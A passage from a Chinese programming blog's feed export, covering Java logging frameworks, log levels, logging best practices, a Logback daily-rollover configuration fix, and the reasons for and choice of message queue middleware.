会成为主流？</strong></p><p>无论从设计上还是实现上，Logback相对log4j而言有了相对多的改进。不过尽管难以一一细数，这里还是列举部分理由为什么选择logback而不是log4j。牢记logback与log4j在概念上面是很相似的，它们都是有同一群开发者建立。所以如果你已经对log4j很熟悉，你也可以很快上手logback。如果你喜欢使用log4j,你也许会迷上使用logback。</p><p><strong>更快的执行速度</strong></p><p>基于我们先前在log4j上的工作，logback 重写了内部的实现，在某些特定的场景上面，甚至可以比之前的速度快上10倍。在保证logback的组件更加快速的同时，同时所需的内存更加少。</p><p>更多请参考《从Log4j迁移到LogBack的理由 》：</p><blockquote><p><a href="http://www.oschina.net/translate/reasons-to-prefer-logbak-over-log4j">http://www.oschina.net/translate/reasons-to-prefer-logbak-over-log4j</a></p></blockquote><h4 id="日志框架总结"><a href="#日志框架总结" class="headerlink" title="日志框架总结"></a>日志框架总结</h4><p>1、<code>commons-loggin</code>, <code>slf4j</code> 只是一种日志抽象门面，不是具体的日志框架。</p><p>2、<code>log4j</code>, <code>logback</code> 是具体的日志实现框架。</p><p>3、一般首选强烈推荐使用 <code>slf4j + logback</code>。当然也可以使用<code>slf4j + log4j</code>, <code>commons-logging + log4j</code> 这两种日志组合框架。</p><p><img src="http://img.javastack.cn/18-5-2/21444405.jpg"></p><p>从上图可以看出 <code>slf4j</code> 很强大吧，不但能和各种日志框架对接，还能和日志门面 <code>commons-logging</code> 进行融合。</p><h3 id="日志级别详解"><a href="#日志级别详解" class="headerlink" title="日志级别详解"></a>日志级别详解</h3><p>日志的输出都是分级别的，不同的设置不同的场合打印不同的日志。下面拿最普遍用的 <code>Log4j</code> 日志框架来做个日志级别的说明，这个也比较奇全，其他的日志框架也都大同小异。</p><p>Log4j 的级别类 <code>org.apache.log4j.Level</code> 里面定义了日志级别，日志输出优先级由高到底分别为以下8种。</p><p><img src="http://img.javastack.cn/18-2-27/44471775.jpg"></p><table><thead><tr><th>日志级别</th><th>描述</th></tr></thead><tbody><tr><td>OFF</td><td>关闭：最高级别，不输出日志。</td></tr><tr><td>FATAL</td><td>致命：输出非常严重的可能会导致应用程序终止的错误。</td></tr><tr><td>ERROR</td><td>错误：输出错误，但应用还能继续运行。</td></tr><tr><td>WARN</td><td>警告：输出可能潜在的危险状况。</td></tr><tr><td>INFO</td><td>信息：输出应用运行过程的详细信息。</td></tr><tr><td>DEBUG</td><td>调试：输出更细致的对调试应用有用的信息。</td></tr><tr><td>TRACE</td><td>跟踪：输出更细致的程序运行轨迹。</td></tr><tr><td>ALL</td><td>所有：输出所有级别信息。</td></tr></tbody></table><p>所以，日志优先级别标准顺序为：</p><blockquote><p>ALL &lt; TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF</p></blockquote><p>如果日志设置为 <code>L</code> ,一个级别为 <code>P</code> 的输出日志只有当 <code>P &gt;= L</code> 时日志才会输出。</p><p>即如果日志级别L设置INFO，只有P的输出级别为INFO、WARN，后面的日志才会正常输出。</p><p>具体的输出关系可以参考下图：</p><p><img src="http://img.javastack.cn/18-2-27/77007337.jpg" alt="image"></p><p><strong>知道了日志级别，这还只是基础，如何了解打日志的规范，以及如何正确地打日志姿势呢？！</strong></p><p><img src="http://img.javastack.cn/18-2-27/42201304.jpg" alt="image"></p><h4 id="打日志的规范准则"><a href="#打日志的规范准则" class="headerlink" title="打日志的规范准则"></a>打日志的规范准则</h4><p>最开始也说过了，日志不能乱打，不然起不到日志本应该起到的作用不说，还会造成系统的负担。在BAT、华为一些大公司都是对日志规范有要求的，什么时候该打什么日志都是有规范的。</p><p>阿里去年发布的《Java开发手册》，里面有一章节就是关于日志规范的，让我们再来回顾下都有什么内容。</p><p><strong>下面是阿里的《Java开发手册》终极版日志规约篇。</strong></p><p><img src="http://img.javastack.cn/18-4-29/8351917.jpg"></p><p>阿里是一线互联网公司，所制定的日志规范也都符合我们的要求，很有参考意义，能把阿里这套日志规约普及也真很不错了。</p><h4 id="项目中该如何正确的打日志？"><a href="#项目中该如何正确的打日志？" class="headerlink" title="项目中该如何正确的打日志？"></a>项目中该如何正确的打日志？</h4><p><strong>1、正确的定义日志</strong></p><pre class="line-numbers language-none"><code class="language-none">private static final Logger LOG &#x3D; LoggerFactory.getLogger(this.getClass());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常一个类只有一个 LOG 对象，如果有父类可以将 LOG 定义在父类中。</p><p>日志变量类型定义为门面接口（如 slf4j 的 Logger），实现类可以是 <code>Log4j</code>、<code>Logback </code> 等日志实现框架，不要把实现类定义为变量类型，否则日志切换不方便，也不符合抽象编程思想。</p><p><strong>2、使用参数化形式<code>{}</code>占位，<code>[]</code> 进行参数隔离</strong></p><pre class="line-numbers language-none"><code class="language-none">LOG.debug(&quot;Save order with order no：[&#123;&#125;], and order amount：[&#123;&#125;]&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这种可读性好，这样一看就知道<code>[]</code>里面是输出的动态参数，<code>{}</code>用来占位类似绑定变量，而且只有真正准备打印的时候才会处理参数，方便定位问题。</p><p>如果日志框架不支持参数化形式，且日志输出时不支持该日志级别时会导致对象冗余创建，浪费内存，此时就需要使用 <code>isXXEnabled</code> 判断，如：</p><pre class="line-numbers language-none"><code class="language-none">if(LOG.isDebugEnabled())&#123;    &#x2F;&#x2F; 如果日志不支持参数化形式，debug又没开启，那字符串拼接就是无用的代码拼接，影响系统性能    logger.debug(&quot;Save order with order no：&quot; + orderNo + &quot;, and order amount：&quot; + orderAmount);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>至少 <code>debug</code> 级别是需要开启判断的，线上日志级别至少应该是 <code>info</code> 以上的。</p><p>这里推荐大家用 <code>SLF4J</code> 的门面接口，可以用参数化形式输出日志，<code>debug</code>  级别也不必用 <code>if</code> 判断，简化代码。</p><p><strong>3、输出不同级别的日志</strong></p><p>项目中最常用有日志级别是<code>ERROR</code>、<code>WARN</code>、<code>INFO</code>、<code>DEBUG</code>四种了，这四个都有怎样的应用场景呢。</p><ul><li><strong>ERROR（错误）</strong></li></ul><p>一般用来记录程序中发生的任何异常错误信息（Throwable），或者是记录业务逻辑出错。</p><ul><li><strong>WARN（警告）</strong></li></ul><p>一般用来记录一些用户输入参数错误、</p><ul><li><strong>INFO（信息）</strong></li></ul><p>这个也是平时用的最低的，也是默认的日志级别，用来记录程序运行中的一些有用的信息。如程序运行开始、结束、耗时、重要参数等信息，需要注意有选择性的有意义的输出，到时候自己找问题看一堆日志却找不到关键日志就没意义了。</p><ul><li><strong>DEBUG（调试）</strong></li></ul><p>这个级别一般记录一些运行中的中间参数信息，只允许在开发环境开启，选择性在测试环境开启。</p><h3 id="几个错误的打日志方式"><a href="#几个错误的打日志方式" class="headerlink" title="几个错误的打日志方式"></a>几个错误的打日志方式</h3><p><strong>1、不要使用 <code>System.out.print..</code></strong></p><p>输出日志的时候只能通过日志框架来输出日志，而不能使用<code>System.out.print..</code>来打印日志，这个只会打印到 <code>tomcat</code> 控制台，而不会记录到日志文件中，不方便管理日志，如果通过服务形式启动把日志丢弃了那更是找不到日志了。</p><p><strong>2、不要使用 <code>e.printStackTrace()</code></strong></p><p>首先来看看它的源码：</p><pre class="line-numbers language-none"><code class="language-none">public void printStackTrace() &#123;    printStackTrace(System.err);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>它其实也是利用 <code>System.err</code> 输出到了 <code>tomcat</code> 控制台。</p><p><strong>3、不要抛出异常后又输出日志</strong></p><p>如捕获异常后又抛出了自定义业务异常，此时无需记录错误日志，由最终捕获方进行异常处理。不能又抛出异常，又打印错误日志，不然会造成重复输出日志。</p><pre class="line-numbers language-none"><code class="language-none">try &#123;&#x2F;&#x2F; ...&#125; catch (Exception e) &#123;    &#x2F;&#x2F; 错误LOG.error(&quot;xxx&quot;, e);throw new RuntimeException();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、不要使用具体的日志实现类</strong></p><pre class="line-numbers language-none"><code class="language-none">InterfaceImpl interface &#x3D; new InterfaceImpl();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这段代码大家都看得懂吧？应该面向接口的对象编程，而不是面向实现，这也是软件设计模式的原则，正确的做法应该是。</p><pre class="line-numbers language-none"><code class="language-none">Interface interface &#x3D; new InterfaceImpl();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>日志框架里面也是如此，上面也说了，日志有门面接口，有具体实现的实现框架，所以大家不要面向实现编程。</p><p><strong>5、没有输出全部错误信息</strong></p><p>看以下代码，这样不会记录详细的堆栈异常信息，只会记录错误基本描述信息，不利于排查问题。</p><pre class="line-numbers language-none"><code class="language-none">try &#123;&#x2F;&#x2F; ...&#125; catch (Exception e) &#123;    &#x2F;&#x2F; 错误LOG.error(&#39;XX 发生异常&#39;, e.getMessage());    &#x2F;&#x2F; 正确    LOG.error(&#39;XX 发生异常&#39;, e);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6、不要使用错误的日志级别</strong></p><p>曾经在线上定位一个问题，同事自信地和我说：<code>明明输出了日志啊，为什么找不到...</code>，后来我去看了下他的代码，是这样的：</p><pre class="line-numbers language-none"><code class="language-none">try &#123;&#x2F;&#x2F; ...&#125; catch (Exception e) &#123;    &#x2F;&#x2F; 错误LOG.info(&quot;XX 发生异常...&quot;, e);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大家看出了什么问题吗？用 <code>info</code> 记录 <code>error</code> 日志，日志输出到了 <code>info</code> 日志文件中了，同事拼命地在 <code>error</code> 错误日志文件里面找怎么能找到呢？</p><p><strong>7、不要在千层循环中打印日志</strong></p><p>这个是什么意思，如果你的框架使用了性能不高的 <code>Log4j</code> 框架，那就不要在上千个 <code>for</code> 循环中打印日志，这样可能会拖垮你的应用程序，如果你的程序响应时间变慢，那要考虑是不是日志打印的过多了。</p><pre class="line-numbers language-none"><code class="language-none">for(int i&#x3D;0; i&lt;2000; i++)&#123;    LOG.info(&quot;XX&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最好的办法是在循环中记录要点，在循环外面总结打印出来。</p><p><strong>8、禁止在线上环境开启 <code>debug</code></strong></p><p>这是最后一点，也是最重要的一点。</p><p>一是因为项目本身 <code>debug</code> 日志太多，二是各种框架中也大量使用 <code>debug</code> 的日志，线上开启 <code>debug</code> 不久就会打满磁盘，影响业务系统的正常运行。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坑爹的日志无法按天切割问题！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/%E5%9D%91%E7%88%B9%E7%9A%84%E6%97%A5%E5%BF%97%E6%97%A0%E6%B3%95%E6%8C%89%E5%A4%A9%E5%88%87%E5%89%B2%E9%97%AE%E9%A2%98%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/%E5%9D%91%E7%88%B9%E7%9A%84%E6%97%A5%E5%BF%97%E6%97%A0%E6%B3%95%E6%8C%89%E5%A4%A9%E5%88%87%E5%89%B2%E9%97%AE%E9%A2%98%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h4 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h4><p>线上某个新管理型系统出现了日志无法按天切割生成日志文件的问题，所有的日志都在一个日志文件里面，只有每次重启的时候才会重新生成文件。</p><p>这个管理系统使用的是 Spring Boot + Logback 框架，查看了 Logback 的日志文件，发现了策略组合使用问题。</p><p>以下是有问题的日志配置代码。</p><pre class="line-numbers language-none"><code class="language-none">&lt;appender name&#x3D;&quot;FILE&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;    &lt;filter class&#x3D;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;        &lt;level&gt;INFO&lt;&#x2F;level&gt;    &lt;&#x2F;filter&gt;        &lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;        &lt;FileNamePattern&gt;$&#123;LOG_PATH&#125;&#x2F;info.log.%d&#123;yyyy-MM-dd&#125;.log&lt;&#x2F;FileNamePattern&gt;        &lt;MaxHistory&gt;30&lt;&#x2F;MaxHistory&gt;    &lt;&#x2F;rollingPolicy&gt;    &lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;        &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;    &lt;&#x2F;encoder&gt;    &lt;triggeringPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&quot;&gt;        &lt;MaxFileSize&gt;10MB&lt;&#x2F;MaxFileSize&gt;    &lt;&#x2F;triggeringPolicy&gt;&lt;&#x2F;appender&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该配置使用了基于时间的滚动切割策略 <code>TimeBasedRollingPolicy</code>，每天0点自动生成一份新的日志文件。</p><p>但里面包含了一段 <code>triggeringPolicy</code> 触发策略，即最大单个文件超过 10MB 自动新成新日志文件，<code>TimeBasedRollingPolicy</code> 是基于时间的，不能和其他策略一起组合使用。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>1、去掉组合策略 <code>triggeringPolicy</code></p><pre class="line-numbers language-none"><code class="language-none">&lt;appender name&#x3D;&quot;FILE&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;    &lt;filter class&#x3D;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;        &lt;level&gt;INFO&lt;&#x2F;level&gt;    &lt;&#x2F;filter&gt;        &lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;        &lt;FileNamePattern&gt;$&#123;LOG_PATH&#125;&#x2F;info.log.%d&#123;yyyy-MM-dd&#125;.log&lt;&#x2F;FileNamePattern&gt;        &lt;MaxHistory&gt;30&lt;&#x2F;MaxHistory&gt;    &lt;&#x2F;rollingPolicy&gt;    &lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;        &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;    &lt;&#x2F;encoder&gt;&lt;&#x2F;appender&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、使用时间和大小组合策略 <code>SizeAndTimeBasedRollingPolicy</code></p><pre class="line-numbers language-none"><code class="language-none">&lt;appender name&#x3D;&quot;FILE&quot; class&#x3D;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;&lt;filter class&#x3D;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;&lt;level&gt;INFO&lt;&#x2F;level&gt;&lt;&#x2F;filter&gt;&lt;rollingPolicy class&#x3D;&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy&quot;&gt;&lt;FileNamePattern&gt;$&#123;LOG_PATH&#125;&#x2F;info.log.%d&#123;yyyy-MM-dd&#125;.%i.log&lt;&#x2F;FileNamePattern&gt;&lt;MaxHistory&gt;30&lt;&#x2F;MaxHistory&gt;&lt;maxFileSize&gt;20MB&lt;&#x2F;maxFileSize&gt;&lt;&#x2F;rollingPolicy&gt;&lt;encoder class&#x3D;&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&lt;&#x2F;pattern&gt;&lt;&#x2F;encoder&gt;&lt;&#x2F;appender&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意后面的 <code>%i</code> 是必须要加上去的，是单个日志文件超大小后的切割序号。</p><p>使用以上两种方案都可以解决 Logback 无法按天切割生成日志的问题，如果这两种解决不了你的问题，那你也要检查下你的滚动策略是否使用正确。</p><h4 id="问题偶遇"><a href="#问题偶遇" class="headerlink" title="问题偶遇"></a>问题偶遇</h4><p>他使用了 Resin + Log4j 框架，还是要检查配置，配置错了一点就会导致无法正常生成滚动日志文件。。。</p><p>如果你对此还有其他的解决方案，欢迎留言。想深入交流，或者对我们所有文章知识点有困惑的，都可以点击左下方的阅读原文链接加入我们的知识星球一起学习。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志打印的 8 种级别，很详细</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0%E7%9A%84%208%20%E7%A7%8D%E7%BA%A7%E5%88%AB%EF%BC%8C%E5%BE%88%E8%AF%A6%E7%BB%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%97%A5%E5%BF%97/%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0%E7%9A%84%208%20%E7%A7%8D%E7%BA%A7%E5%88%AB%EF%BC%8C%E5%BE%88%E8%AF%A6%E7%BB%86/</url>
      
        <content type="html"><![CDATA[<p>日志的输出都是分级别的，不同的设置不同的场合打印不同的日志。下面拿最普遍用的Log4j日志框架来做个日志级别的说明，其他大同小异。</p><p>Log4j的级别类<code>org.apache.log4j.Level</code>里面定义了日志级别，日志输出优先级由高到底分别为以下8种。</p><p><img src="http://img.javastack.cn/18-2-27/44471775.jpg"></p><table><thead><tr><th>日志级别</th><th>描述</th></tr></thead><tbody><tr><td>OFF</td><td>关闭：最高级别，不打印日志。</td></tr><tr><td>FATAL</td><td>致命：指明非常严重的可能会导致应用终止执行错误事件。</td></tr><tr><td>ERROR</td><td>错误：指明错误事件，但应用可能还能继续运行。</td></tr><tr><td>WARN</td><td>警告：指明可能潜在的危险状况。</td></tr><tr><td>INFO</td><td>信息：指明描述信息，从粗粒度上描述了应用运行过程。</td></tr><tr><td>DEBUG</td><td>调试：指明细致的事件信息，对调试应用最有用。</td></tr><tr><td>TRACE</td><td>跟踪：指明程序运行轨迹，比DEBUG级别的粒度更细。</td></tr><tr><td>ALL</td><td>所有：所有日志级别，包括定制级别。</td></tr></tbody></table><p>所以，日志优先级别标准顺序为：</p><blockquote><p>ALL &lt; TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF</p></blockquote><p>如果日志设置为L,一个级别为P的输出日志只有当P &gt;&#x3D; L时日志才会输出。</p><p>即如果日志级别L设置INFO，只有P的输出级别为INFO、WARN，后面的日志才会正常输出。</p><p>具体的输出关系可以参考下图：</p><p><img src="http://img.javastack.cn/18-2-27/77007337.jpg" alt="image"></p><p><strong>知道了日志级别，这还只是基础，如何了解正确地打日志姿势呢？明天继续讲如何正确地输出日志！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么高并发需要用消息队列？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%AB%98%E5%B9%B6%E5%8F%91%E9%9C%80%E8%A6%81%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%AB%98%E5%B9%B6%E5%8F%91%E9%9C%80%E8%A6%81%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>一、消息队列的特性</strong></p><p>业务无关，一个具有普适性质的消息队列组件不需要考虑上层的业务模型，只做好消息的分发就可以了，上层业务的不同模块反而需要依赖消息队列所定义的规范进行通信。</p><p>FIFO，先投递先到达的保证是一个消息队列和一个buffer的本质区别。</p><p>容灾，对于普适的消息队列组件来说，节点的动态增删和消息的持久化，都是支持其容灾能力的重要基本特性。当然，这个特性对于游戏服务器中大部分应用中的消息队列来说不是必须的，这个也是跟应用情景有关的，很多时候没有这种持久化的需求。</p><p>性能，这个不必多说了，消息队列的吞吐量上去了，整个系统的内部通信效率也会有提高。</p><p><strong>二、为什么需要消息队列？</strong></p><p>当系统中出现“生产“和“消费“的速度或稳定性等因素不一致的时候，就需要消息队列，作为抽象层，弥合双方的差异。“ 消息 ”是在两台计算机间传送的数据单位。消息可以非常简单，例如只包含文本字符串；也可以更复杂，可能包含嵌入对象。消息被发送到队列中，“ 消息队列 ”是在消息的传输过程中保存消息的容器 。</p><p>举几个例子</p><p>1）业务系统触发短信发送申请，但短信发送模块速度跟不上，需要将来不及处理的消息暂存一下，缓冲压力。就可以把短信发送申请丢到消息队列，直接返回用户成功，短信发送模块再可以慢慢去消息队列中取消息进行处理。</p><p>2）调远程系统下订单成本较高，且因为网络等因素，不稳定，攒一批一起发送。</p><p>3）任务处理类的系统，先把用户发起的任务请求接收过来存到消息队列中，然后后端开启多个应用程序从队列中取任务进行处理。</p><p><strong>三、使用消息队列有什么好处？</strong></p><p>3.1、提高系统响应速度</p><p>使用了消息队列，生产者一方，把消息往队列里一扔，就可以立马返回，响应用户了。无需等待处理结果。</p><p>处理结果可以让用户稍后自己来取，如医院取化验单。也可以让生产者订阅（如：留下手机号码或让生产者实现listener接口、加入监听队列），有结果了通知。获得约定将结果放在某处，无需通知。</p><p>3.2、提高系统稳定性</p><p>考虑电商系统下订单，发送数据给生产系统的情况。电商系统和生产系统之间的网络有可能掉线，生产系统可能会因维护等原因暂停服务。如果不使用消息队列，电商系统数据发布出去，顾客无法下单，影响业务开展。两个系统间不应该如此紧密耦合。应该通过消息队列解耦。同时让系统更健壮、稳定。</p><p>异步化、解耦、消除峰值</p><p>以上三点其实可以用一个例子来解释——设想有一款MMO游戏，没有人肉写的缓存层或者ORM，所有逻辑节点都直连MySQL，逻辑节点内除了要关注场景、战斗、交互等复杂逻辑以外，还要有个拼SQL语句的模块，想想简直是蛋疼。先考虑一下这样设计的弊端所在：</p><ol><li><p>逻辑节点与Db的交互会有大量IO，即使把与Db交互的模块耦合在逻辑节点内，其实现对你来说是黑盒，如果内部是同步实现的，那就直接卡你游戏主逻辑，就因为一次存盘操作，玩家们都掉线了，服务器也可以关掉了。</p></li><li><p>那么我们改进一下，针对1的情况，可以把这个模块做到一个线程里挂在逻辑节点上。这样其实逻辑节点跟这个Db前端模块的交互就会基于一个比较原始的消息队列。但是这样还有一个坏处，那就是这两种任务一种是计算密集的（玩家的逻辑处理）、一种是IO密集的（只负责写入读取MySQL），搞到一个节点中，扩展起来会非常麻烦，而且耦合度太高。比如说现在发现场景放单节点上有瓶颈，要按场景分节点，那么这种挂在上面的数据模块怎么跟其他场景的交互呢？</p></li><li><p>峰值的问题。在分布式系统中，一次分布式事务关联的是多个节点，其中每一个节点出现问题都会成为整个事务处理流程中的瓶颈。如果逻辑节点与数据库之间没有一个起到缓冲作用的节点，那就是每次操作都要访问数据库，对于MMO来说，一个玩家上线load几百K数据，一个服10万个玩家上线已经足够搞垮一个mysql节点了。如果直接搞垮还是比较好的结果，至少是前面的玩家确实登录上去了并且可以正常游戏，后面的玩家登录不上。但是很可惜，十年前开始流行的C10K说法就是在讲：并发量上来之后，会造成chain reaction，大量的并发不会直接挂掉你的mysql节点，但是会拖慢速度，降低吞吐量，一个玩家的请求由于处理时间太长，导致玩家放弃重试，但是对于后端来说，对该玩家之前的处理过程消耗的资源就全部浪费了，陷入恶性循环。</p></li></ol><p>所以，这种情景下，一个介于逻辑节点和db节点之间的缓存节点就是理所当然的事情了。这个缓存节点其实很多时候也可以看作是一个更复杂的消息队列节点。</p><p><strong>四、为什么需要分布式？</strong></p><p>4.1、多系统协作需要分布式</p><p>消息队列中的数据需要在多个系统间共享数据才能发挥价值。所以必须提供分布式通信机制、协同机制。</p><p>4.2、单系统内部署环境需要分布式</p><p>单系统内部，为了更好的性能、为了避免单点故障，多为集群环境。集群环境中，应用运行在多台服务器的多个JVM中；数据也保存在各种类型的数据库或非数据库的多个节点上。为了满足多节点协作需要，需要提供分布式的解决方案。</p><p><strong>五、分布式环境下需要解决哪些问题？</strong></p><p>5.1、并发问题</p><p>需进行良好的并发控制。确保“线程安全“。不要出现一个订单被出货两次。不要出现顾客A下的单，发货发给了顾客B等情况。</p><p>5.2、简单的、统一的操作机制</p><p>需定义简单的，语义明确的，业务无关的，恰当稳妥的统一的访问方式。</p><p>5.3、容错</p><p>控制好单点故障，确保数据安全。</p><p>5.4、可横向扩展</p><p>可便捷扩容。</p><p><strong>六、如何实现？</strong></p><p>成熟的消息队列中间件产品太多了，族繁不及备载。成熟产品经过验证，接口规范，可扩展性强。</p><p>结合事业环境因素、组织过程遗产、实施运维考虑、技术路线考虑、开发人员情况等原因综合考虑。</p><blockquote><p>参考：<a href="http://www.ywnds.com/?p=5791">http://www.ywnds.com/?p=5791</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息中间件如何选型？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A6%82%E4%BD%95%E9%80%89%E5%9E%8B%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A6%82%E4%BD%95%E9%80%89%E5%9E%8B%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-20/18663287.jpg"></p><p>最近要为公司的消息队列中间件进行选型，市面上相关的开源技术又非常多，如ActiveMQ、RabbitMQ、ZeroMQ、Kafka，还有阿里巴巴的RocketMQ等。</p><p><strong>这么多技术，如何进行选型呢？</strong></p><p>首先对于阿里的RocketMQ，因为是阿里开源的，对于国内开源的保持谨慎的态度，暂时不采取该中间件。</p><p>所以只能在ActiveMQ、RabbitMQ、ZeroMQ、Kafka中间选一款作为消息队列中间件。</p><p><strong>下面从几个维度来对比下</strong></p><p><strong>1、社区活跃度</strong></p><p>从目前网上的资料上看，RabbitMQ、activeMQ、ZeroMQ三者中RabbitMQ绝对是首选。 </p><p><strong>2、消息持久化</strong></p><p>ZeroMq不支持消息持久化，ActiveMQ和RabbitMQ都支持。</p><p><strong>3、核心技术</strong></p><p>可靠性、灵活的路由、集群、事务、高可用的队列、消息排序、问题追踪、可视化管理工具、插件系统等等。</p><p>RabbitMq &#x2F; Kafka最好，ActiveMQ次之，ZeroMQ最差。当然ZeroMQ也可以做到，不过自己必须手动写代码实现，工作量不小。尤其是可靠性中的：持久性、投递确认、发布者证实和高可用性。</p><p><strong>4、高并发</strong></p><p>毋庸置疑RabbitMQ最高，因为RabbitMQ是由天生具备高并发高可用特性的erlang语言实现的。</p><p>以上对比参考来源网络，大同小异。总结就是需要从RabbitMQ和Kafka之间选一款适合自己的。RabbitMQ和Kafka这两款无疑也是现在市场上有得比较多的两款消息队列中间件，从网络资料和面试要求也可以看得出来。</p><blockquote><p>关于这两者非常全的评测，参考：<a 